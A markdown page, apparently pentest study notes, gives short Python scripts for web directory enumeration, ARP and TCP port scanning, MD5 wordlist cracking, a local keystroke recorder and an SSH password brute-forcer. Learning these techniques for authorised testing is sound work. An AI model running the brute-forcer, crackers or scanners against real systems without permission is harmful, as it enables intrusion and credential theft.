# Python code for Penetration Testing

## Basic web app directory enumeration

Similar to : `gobuster dir -u http://<DOMAIN> -w <WORDLIST> -x html`

```python
import requests
import sys

domain = sys.argv[1]
dir_name_list = sys.argv[2]

with open(dir_name_list, 'r') as f:
    dir_names = f.read().split('\n')

for dir_name in dir_names:
    url = f'http://{domain}/{dir_name}.html'
    response = requests.get(url)
    if response.status_code != 404:
        print(dir_name)
```

## ARP scanner

```python
from scapy.all import *

interface = "ens5"
ip_range = "10.201.71.0/24"
broadcast_mac = "ff:ff:ff:ff:ff:ff"

# use srp (send and receive packet at layer 2) to send all packets and collect their responses
packet = Ether(dst=broadcast_mac) / ARP(pdst=ip_range)
answered, unanswered = srp(packet, timeout=30, iface=interface, inter=0.1, verbose=0)

for (sent, received) in answered:
    print(received.sprintf(r"%Ether.src% - %ARP.psrc%"))
```

## Port scanner

This scan does a full TCP connection with the `socket` module.  
If we want a half-open connection (like `nmap -sS`) we should use a lower level module like `scapy`.

```python
import sys
import socket

target_ip = sys.argv[1]

for port in range(1, 65535):
    try: 
        # socket.AF_INET : use IPv4
        # socket.SOCK_STREAM : use TCP
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        sock.settimeout(0.5) 
        # connect() throws on failure, while connect_ex() returns an error code
        response = sock.connect_ex((target_ip, port))
        if response == 0:
            print(port)
        sock.close() 
    except Exception as e: 
        pass 
```

## File Downloader (wget)

```python
import requests
import sys

url = sys.argv[1]
r = requests.get(url, allow_redirects=True)
open('myfile', 'wb').write(r.content) 
```

## MD5 Hash Cracker

Similar to : `john --format=raw-md5 --wordlist=<WORDLIST> <HASH_FILE>`

```python
import hashlib
import sys

target_hash = sys.argv[1]
wordlist = sys.argv[2]

with open(wordlist, 'r') as f:
    words = f.read().split('\n')
    
for word in words:
    encoded = word.strip().encode()               # convert the string to bytes for the md5() function
    word_hash = hashlib.md5(encoded).hexdigest()  # convert the hash into its hexadecimal string representation
    if word_hash == target_hash:
        print(word)
        break
```

## Keylogger

This only captures keystrokes from a physical keyboard, not from a remote session (like SSH).

```python
import keyboard

keys = keyboard.record(until='ENTER')
keyboard.play(keys)
```

## SSH Bruteforce

```python
import paramiko    # SSHClient
import sys

target_ip = sys.argv[1]
username = sys.argv[2]
wordlist = sys.argv[3]

def ssh_connect(password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    success = True
    try:
        ssh.connect(target_ip, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        success = False
    ssh.close()
    return success

with open(wordlist, 'r') as f:
    words = f.read().split('\n')

for word in words:
    if ssh_connect(word.strip()):
            print(word)
            break
```